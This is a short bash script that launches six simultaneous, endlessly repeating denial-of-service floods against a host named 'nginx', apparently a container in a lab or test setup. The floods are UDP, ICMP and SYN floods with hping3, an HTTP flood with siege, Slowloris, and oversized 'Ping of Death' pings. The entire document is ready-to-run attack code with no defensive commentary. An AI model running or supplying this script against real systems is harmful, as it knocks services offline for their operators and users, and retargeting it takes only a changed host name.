#!/bin/bash

echo "Starting attack on nginx:80 container"

while true
do
  # Perform UDP Flood attack
  (while true; do hping3 -c 10000 --udp -p 80 nginx; done) &

  # Perform ICMP Flood attack
  (while true; do hping3 -c 10000 --icmp nginx; done) &

  # Perform HTTP Flood attack
  (while true; do siege -c160 -t60s nginx; done) &

  # Perform Slowloris attack
  (while true; do slowloris -s 500 --sleeptime 0 nginx; done) &

  # Perform SYN Flood attack
  (while true; do hping3 -c 10000 --syn -p 80 nginx; done) &

  # Perform Ping of Death attack
  (while true; do ping -s 65535 -c 100 nginx; done) &

  wait
done
